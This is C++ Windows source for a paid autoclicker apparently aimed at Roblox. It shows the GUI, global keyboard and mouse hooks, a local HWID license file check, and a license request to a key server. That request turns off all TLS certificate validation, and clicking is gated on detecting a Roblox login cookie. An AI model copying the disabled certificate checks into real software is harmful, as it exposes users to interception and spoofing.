        HINSTANCE hi    = ((CREATESTRUCT*)lp)->hInstance;
        HFONT     hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        hIconFont = CreateFontW(-16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, L"Segoe MDL2 Assets");

        CreateWindowW(L"STATIC", L"\u9EDE\u64CA\u901F\u5EA6 (CPS)\uFF1A", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 18, 190, 16, hwnd, nullptr, hi, nullptr);
        HWND hIco1 = CreateWindowW(L"STATIC", L"\uE962", WS_CHILD | WS_VISIBLE | SS_CENTER, 20, 44, 22, 24, hwnd, nullptr, hi, nullptr);
        if (hIconFont) SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
        hEditCPS = CreateWindowW(L"EDIT", L"999", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER | ES_CENTER, 50, 44, 160, 24, hwnd, (HMENU)IDC_EDIT_CPS, hi, nullptr);

        CreateWindowW(L"STATIC", L"\u958B\u59CB/\u505C\u6B62\u71B1\u9375\uFF1A", WS_CHILD | WS_VISIBLE | SS_LEFT, 248, 18, 190, 16, hwnd, nullptr, hi, nullptr);
        hBtnSetHotkey = CreateWindowW(L"BUTTON", L"\u2328", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 248, 44, 24, 24, hwnd, (HMENU)IDC_BTN_SETHOTKEY, hi, nullptr);
        { wchar_t name[64] = {}; VkToName(g_hotkey_vk.load(), name, 64); hEditHotkey = CreateWindowW(L"EDIT", name, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER | ES_READONLY, 278, 44, 158, 24, hwnd, (HMENU)IDC_EDIT_HOTKEY, hi, nullptr); }

        CreateWindowW(L"BUTTON", L"\u21BA \u66F4\u65B0\u8A2D\u5B9A", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 12, 102, 210, 28, hwnd, (HMENU)IDC_BTN_UPDATE, hi, nullptr);
        hBtnPin = CreateWindowW(L"BUTTON", L"\u2736 \u91D8\u9078", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 238, 102, 210, 28, hwnd, (HMENU)IDC_BTN_PIN, hi, nullptr);
        hBtnStart = CreateWindowW(L"BUTTON", L"\u958B\u59CB", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 12, 142, 210, 34, hwnd, (HMENU)IDC_BTN_START, hi, nullptr);
        hBtnStop = CreateWindowW(L"BUTTON", L"\u505C\u6B62", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 238, 142, 210, 34, hwnd, (HMENU)IDC_BTN_STOP, hi, nullptr);
        hLblStatus = CreateWindowW(L"STATIC", L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D", WS_CHILD | WS_VISIBLE | SS_CENTER, 12, 188, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);
        CreateWindowW(L"STATIC", L"\u958B\u59CB\u524D\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie", WS_CHILD | WS_VISIBLE | SS_LEFT, 12, 221, 400, 16, hwnd, nullptr, hi, nullptr);
        CreateWindowW(L"BUTTON", L"?", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 436, 218, 22, 20, hwnd, (HMENU)IDC_BTN_HELP, hi, nullptr);

        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
        if (hIconFont) SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
        HANDLE hThread = CreateThread(nullptr, 0, ClickThread, nullptr, 0, nullptr);
        if (hThread) CloseHandle(hThread);
        g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
        g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
        return 0;
    }

    case WM_APP + 1: {
        wchar_t name[64] = {}; VkToName(g_hotkey_vk.load(), name, 64);
        SetWindowTextW(hEditHotkey, name); SetWindowTextW(hBtnSetHotkey, L"\u2328");
        EnableWindow(hBtnStart, TRUE); EnableWindow(hBtnStop, TRUE);
        wchar_t info[128]; swprintf_s(info, 128, L"\u71B1\u9375\u5DF2\u8A2D\u5B9A\u70BA\uFF1A%s", name);
        UpdateStatusText(hLblStatus, info);
        return 0;
    }
    case WM_APP + 2: {
        if (!g_running.load()) { if (CheckRobloxCookiePresent(hwnd)) { g_running.store(true); UpdateStatusText(hLblStatus, L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D"); } }
        return 0;
    }
    case WM_APP + 3: { UpdateStatusText(hLblStatus, L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D"); return 0; }

    case WM_PAINT: {
        PAINTSTRUCT ps; HDC hdc = BeginPaint(hwnd, &ps);
        HPEN hPen = CreatePen(PS_SOLID, 1, RGB(200, 200, 200)); HPEN hOldPen = (HPEN)SelectObject(hdc, hPen); HBRUSH hOldBr = (HBRUSH)SelectObject(hdc, GetStockObject(WHITE_BRUSH));
        RoundRect(hdc, 12, 12, 224, 90, 10, 10); RoundRect(hdc, 236, 12, 448, 90, 10, 10);
        SelectObject(hdc, hOldBr); SelectObject(hdc, hOldPen); DeleteObject(hPen);
        HPEN hSep = CreatePen(PS_SOLID, 1, RGB(220, 220, 220)); HPEN hOldSep = (HPEN)SelectObject(hdc, hSep);
        MoveToEx(hdc, 10, 213, nullptr); LineTo(hdc, 450, 213);
        SelectObject(hdc, hOldSep); DeleteObject(hSep);
        EndPaint(hwnd, &ps); return 0;
    }

    case WM_DRAWITEM: {
        DRAWITEMSTRUCT* dis = (DRAWITEMSTRUCT*)lp;
        if (dis->CtlType != ODT_BUTTON) break;
        if (dis->CtlID != IDC_BTN_START && dis->CtlID != IDC_BTN_STOP) break;
        bool isStart = (dis->CtlID == IDC_BTN_START);
        bool pressed = (dis->itemState & ODS_SELECTED) != 0;
        COLORREF clrNorm = isStart ? RGB(34, 197, 94) : RGB(239, 68, 68);
        COLORREF clrPress = isStart ? RGB(22, 163, 74) : RGB(220, 38, 38);
        COLORREF clrFill = pressed ? clrPress : clrNorm;
        HBRUSH hBrFill = CreateSolidBrush(clrFill); FillRect(dis->hDC, &dis->rcItem, hBrFill); DeleteObject(hBrFill);
        HPEN hPen = CreatePen(PS_SOLID, 1, clrPress); HPEN hOldPen = (HPEN)SelectObject(dis->hDC, hPen); HBRUSH hOldBr = (HBRUSH)SelectObject(dis->hDC, GetStockObject(NULL_BRUSH));
        RoundRect(dis->hDC, dis->rcItem.left, dis->rcItem.top, dis->rcItem.right - 1, dis->rcItem.bottom - 1, 6, 6);
        SelectObject(dis->hDC, hOldPen); SelectObject(dis->hDC, hOldBr); DeleteObject(hPen);
        SetBkMode(dis->hDC, TRANSPARENT); SetTextColor(dis->hDC, RGB(255, 255, 255));
        HFONT hF = (HFONT)GetStockObject(DEFAULT_GUI_FONT); HFONT hOldF = (HFONT)SelectObject(dis->hDC, hF);
        wchar_t txt[64] = {}; GetWindowTextW(dis->hwndItem, txt, 64);
        DrawTextW(dis->hDC, txt, -1, &dis->rcItem, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(dis->hDC, hOldF);
        return TRUE;
    }

    case WM_CTLCOLORSTATIC: {
        if ((HWND)lp == hLblStatus) {
            HDC hdc = (HDC)wp; SetBkMode(hdc, OPAQUE); SetBkColor(hdc, GetSysColor(COLOR_BTNFACE));
            SetTextColor(hdc, g_running ? RGB(34, 197, 94) : RGB(100, 100, 100));
            return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
        }
        break;
    }

    case WM_COMMAND:
        switch (LOWORD(wp)) {
        case IDC_BTN_UPDATE: {
            wchar_t buf[32] = {}; GetWindowTextW(hEditCPS, buf, 32);
            int cps_val = _wtoi(buf);
            if (cps_val < 1 || cps_val > 9999) { MessageBoxW(hwnd, L"CPS \u5FC5\u9808\u662F 1\uFF5E9999", L"\u932F\u8AA4", MB_ICONERROR | MB_OK); break; }
            g_cps = cps_val;
            wchar_t hk_name[64] = {}; VkToName(g_hotkey_vk.load(), hk_name, 64);
            wchar_t info[128]; swprintf_s(info, 128, L"CPS = %d\n\u71B1\u9375 = %s", cps_val, hk_name);
            MessageBoxW(hwnd, info, L"\u8A2D\u5B9A\u66F4\u65B0", MB_ICONINFORMATION | MB_OK);
            break;
        }
        case IDC_BTN_SETHOTKEY: {
            g_running.store(false); g_listening_hotkey.store(true);
            SetWindowTextW(hEditHotkey, L"\u8ACB\u6309\u4EFB\u610F\u9375..."); SetWindowTextW(hBtnSetHotkey, L"\u2026");
            EnableWindow(hBtnStart, FALSE); EnableWindow(hBtnStop, FALSE);
            UpdateStatusText(hLblStatus, L"\u2328 \u6B63\u5728\u76E3\u807D\u65B0\u71B1\u9375\u2026");
            break;
        }
        case IDC_BTN_START:
            if (g_listening_hotkey.load()) break;
            if (!CheckRobloxCookiePresent(hwnd)) break;
            g_running = true;
            UpdateStatusText(hLblStatus, L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
            break;
        case IDC_BTN_STOP:
            if (g_listening_hotkey.load()) break;
            g_running = false;
            UpdateStatusText(hLblStatus, L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
            break;
        case IDC_BTN_PIN:
            g_pinned = !g_pinned;
            SetWindowPos(hwnd, g_pinned ? HWND_TOPMOST : HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            SetWindowTextW(hBtnPin, g_pinned ? L"\u2736 \u5DF2\u91D8\u9078" : L"\u2736 \u91D8\u9078");
            break;
        case IDC_BTN_HELP:
            MessageBoxW(hwnd,
                L"\u3010Roblox \u5075\u6E2C\u529F\u80FD\u8AAA\u660E\u3011\n\n"
                L"\u6BCF\u6B21\u6309\u4E0B\u300C\u958B\u59CB\u300D\u6642\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie\u3002\n"
                L"\u5075\u6E2C\u5230 Cookie \u2192 \u5141\u8A31\u555F\u52D5\n"
                L"\u672A\u5075\u6E2C\u5230 \u2192 \u986F\u793A\u300C\u8ACB\u5148\u958B\u555F Roblox\u300D",
                L"\u8AAA\u660E", MB_ICONINFORMATION | MB_OK);
            break;
        }
        return 0;

    case WM_DESTROY:
        g_program_running = false; g_running = false;
        if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
        if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
        if (g_hwnd_cookie && IsWindow(g_hwnd_cookie)) DestroyWindow(g_hwnd_cookie);
        if (g_mutex) { CloseHandle(g_mutex); g_mutex = nullptr; }
        if (hIconFont) { DeleteObject(hIconFont); hIconFont = nullptr; }
        timeEndPeriod(1);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

// ======================================================================
// checkHWID 驗證系統
// ======================================================================
static void GetExeDirYY(wchar_t* buf, int bufLen) {
    GetModuleFileNameW(NULL, buf, bufLen);
    int i = 0, last = -1;
    while (buf[i] != L'\0') { if (buf[i] == L'\\' || buf[i] == L'/') last = i; i++; }
    if (last >= 0) buf[last] = L'\0';
}

static bool HmacSha256YY(const BYTE* key, DWORD keyLen, const BYTE* data, DWORD dataLen, BYTE* hash, DWORD hashLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) == 0) {
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, keyLen, 0) == 0) {
            if (BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) == 0) { if (BCryptFinishHash(hHash, hash, hashLen, 0) == 0) ok = true; }
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return ok;
}

static bool Sha512YY(const BYTE* data, DWORD dataLen, BYTE* hash, DWORD hashLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hHash = NULL; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0) == 0) {
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0) {
            if (BCryptHashData(hHash, (PUCHAR)data, dataLen, 0) == 0) { if (BCryptFinishHash(hHash, hash, hashLen, 0) == 0) ok = true; }
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return ok;
}

static void BytesToHexYY(const BYTE* bytes, int len, char* hex) {
    const char* hc = "0123456789abcdef";
    for (int i = 0; i < len; i++) { hex[i*2] = hc[(bytes[i]>>4)&0xF]; hex[i*2+1] = hc[bytes[i]&0xF]; }
    hex[len*2] = '\0';
}

static void ComputeEncryptedHWIDYY(const char* rawHwid, char* outHex64) {
    BYTE hash[32];
    HmacSha256YY((const BYTE*)HWID_SALT, (DWORD)strlen(HWID_SALT), (const BYTE*)rawHwid, (DWORD)strlen(rawHwid), hash, 32);
    BytesToHexYY(hash, 32, outHex64);
}

static void ComputeMachineCodeYY(const char* key, const char* hwidHash, char* outHex64) {
    char payload[2048] = {};
    wsprintfA(payload, "%s:%s:%s", key, hwidHash, HWID_SALT);
    BYTE hash[64];
    Sha512YY((const BYTE*)payload, (DWORD)strlen(payload), hash, 64);
    char fullHex[129];
    BytesToHexYY(hash, 64, fullHex);
    for (int i = 0; i < 64; i++) outHex64[i] = fullHex[i];
    outHex64[64] = '\0';
}

static bool ValidateCheckHWID(const char* key_utf8) {
    wchar_t exeDir[MAX_PATH]; GetExeDirYY(exeDir, MAX_PATH);
    wchar_t dirPath[MAX_PATH]; wsprintfW(dirPath, L"%s\\%s", exeDir, CHECK_HWID_DIR);
    DWORD dirAttr = GetFileAttributesW(dirPath);
    if (dirAttr == INVALID_FILE_ATTRIBUTES || !(dirAttr & FILE_ATTRIBUTE_DIRECTORY)) return false;

    wchar_t filePath[MAX_PATH]; wsprintfW(filePath, L"%s\\%s\\%s", exeDir, CHECK_HWID_DIR, HWID_FILE);
    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    char buf[4096] = {}; DWORD bytesRead;
    ReadFile(hFile, buf, sizeof(buf)-1, &bytesRead, NULL);
    CloseHandle(hFile);

    char* p1 = strstr(buf, "\"hwid_hash\""); char* p2 = strstr(buf, "\"machine_code\"");
    if (!p1 || !p2) return false;

    char storedHash[128] = {}, storedMC[128] = {};
    char* v1 = strchr(p1+11, '"'); if (!v1) return false; v1++;
    char* e1 = strchr(v1, '"'); if (!e1) return false;
    int len1 = (int)(e1-v1); if (len1 >= 128) return false;
    for (int i=0; i<len1; i++) storedHash[i] = v1[i]; storedHash[len1] = '\0';

    char* v2 = strchr(p2+14, '"'); if (!v2) return false; v2++;
    char* e2 = strchr(v2, '"'); if (!e2) return false;
    int len2 = (int)(e2-v2); if (len2 >= 128) return false;
    for (int i=0; i<len2; i++) storedMC[i] = v2[i]; storedMC[len2] = '\0';

    wchar_t comp[MAX_COMPUTERNAME_LENGTH+1] = {}; DWORD cs = MAX_COMPUTERNAME_LENGTH+1; GetComputerNameW(comp, &cs);
    wchar_t user[256] = {}; DWORD us = 256; GetUserNameW(user, &us);
    wchar_t hwid_w[512] = {}; swprintf_s(hwid_w, 512, L"%s_%s", comp, user);
    char hwid_utf8[512] = {}; WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, hwid_utf8, 512, NULL, NULL);

    char currentHash[128] = {}; ComputeEncryptedHWIDYY(hwid_utf8, currentHash);
    if (strcmp(storedHash, currentHash) != 0) return false;

    char expectedMC[128] = {}; ComputeMachineCodeYY(key_utf8, currentHash, expectedMC);
    if (strcmp(storedMC, expectedMC) != 0) return false;
    return true;
}

// ======================================================================
// 金鑰驗證（向 Discord Bot 伺服器）— 只接受 1YN- 格式
// ======================================================================
static bool VerifyLicenseKey(const wchar_t* key)
{
    if (!key || wcslen(key) < 10) return false;

    wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computer_name, &cn_size);
    wchar_t user_name[256] = {};
    DWORD un_size = 256;
    GetUserNameW(user_name, &un_size);
    wchar_t hwid_w[512] = {};
    swprintf_s(hwid_w, 512, L"%s_%s", computer_name, user_name);

    int key_len = WideCharToMultiByte(CP_UTF8, 0, key, -1, nullptr, 0, nullptr, nullptr);
    char* key_utf8 = new char[key_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, key, -1, key_utf8, key_len, nullptr, nullptr);
    int hwid_len = WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, nullptr, 0, nullptr, nullptr);
    char* hwid_utf8 = new char[hwid_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, hwid_w, -1, hwid_utf8, hwid_len, nullptr, nullptr);

    std::string json = "{";
    json += "\"key\":\"";  json += JsonEscape(key_utf8);  json += "\",";
    json += "\"hwid\":\""; json += JsonEscape(hwid_utf8); json += "\"";
    json += "}";
    delete[] key_utf8; delete[] hwid_utf8;

    HINTERNET hSession = WinHttpOpen(L"YYClicker/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
    HINTERNET hConnect = WinHttpConnect(hSession, KEY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", KEY_VERIFY_PATH, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    DWORD timeout = 10000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers), (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);
    if (!bResult) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
    char respBuf[2048] = {}; DWORD bytesRead = 0;
    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);

    if (statusCode == 200 && strstr(respBuf, "\"valid\":true")) return true;
    return false;
}

// ======================================================================
// WinMain
// ======================================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nShow)
{
    g_hInst = hInst;

    // 必須透過 1ynkeycheck.exe 傳入金鑰作為命令列參數
    if (!lpCmdLine || strlen(lpCmdLine) < 10) return 0;

    wchar_t key_w[256] = {};
    MultiByteToWideChar(CP_ACP, 0, lpCmdLine, -1, key_w, 256);

    // 去除前後空白和引號
    wchar_t* key_start = key_w;
    while (*key_start == L' ' || *key_start == L'"') key_start++;
    int key_end = (int)wcslen(key_start) - 1;
    while (key_end >= 0 && (key_start[key_end] == L' ' || key_start[key_end] == L'"'))
        key_start[key_end--] = L'\0';

    char key_utf8[512] = {};
    WideCharToMultiByte(CP_UTF8, 0, key_start, -1, key_utf8, 512, NULL, NULL);

    // 檢查 checkHWID 資料夾
    bool hwidValid = ValidateCheckHWID(key_utf8);

    // 向伺服器驗證金鑰
    if (!VerifyLicenseKey(key_start)) {
        if (hwidValid) {
            // 離線模式：本機 HWID 已驗證，允許啟動
        } else {
            MessageBoxW(nullptr,
                L"\u91D1\u9470\u9A57\u8B49\u5931\u6557\uFF01\n\n"
                L"\u53EF\u80FD\u7684\u539F\u56E0\uFF1A\n"
                L"\u2022 \u91D1\u9470\u7121\u6548\u6216\u5DF2\u904E\u671F\n"
                L"\u2022 \u6B64\u91D1\u9470\u5DF2\u7D81\u5B9A\u81F3\u5176\u4ED6\u88DD\u7F6E\n"
                L"\u2022 \u7DB2\u8DEF\u9023\u7DDA\u5931\u6557\n"
                L"\u2022 checkHWID \u8CC7\u6599\u593E\u907A\u5931\u6216\u640D\u58DE\n\n"
                L"\u8ACB\u5728 Discord \u4E2D\u78BA\u8A8D\u60A8\u7684\u91D1\u9470\u72C0\u614B\u3002",
                L"1yn AutoClick - \u91D1\u9470\u9A57\u8B49",
                MB_ICONERROR | MB_OK);
            return 0;
        }
    }

    if (!EnsureSingleInstance()) return 0;
    timeBeginPeriod(1);
    InitInputs();

    { WNDCLASSW wc = {}; wc.lpfnWndProc = CookieWndProc; wc.hInstance = hInst; wc.lpszClassName = COOKIE_WND_CLASS; wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); wc.hCursor = LoadCursorW(nullptr, IDC_ARROW); RegisterClassW(&wc); }

    WNDCLASSW wc = {}; wc.lpfnWndProc = WndProc; wc.hInstance = hInst; wc.lpszClassName = WND_CLASS; wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); wc.hCursor = LoadCursorW(nullptr, IDC_ARROW); wc.hIcon = LoadIconW(nullptr, IDI_APPLICATION);
    if (!RegisterClassW(&wc)) return 1;

    RECT rc = { 0, 0, 460, 248 };
    AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
    g_hwnd = CreateWindowExW(0, WND_CLASS, WINDOW_TITLE, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left, rc.bottom - rc.top, nullptr, nullptr, hInst, nullptr);
    if (!g_hwnd) return 1;

    ShowWindow(g_hwnd, nShow);
    UpdateWindow(g_hwnd);

    MSG msg = {};
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    return (int)msg.wParam;
}
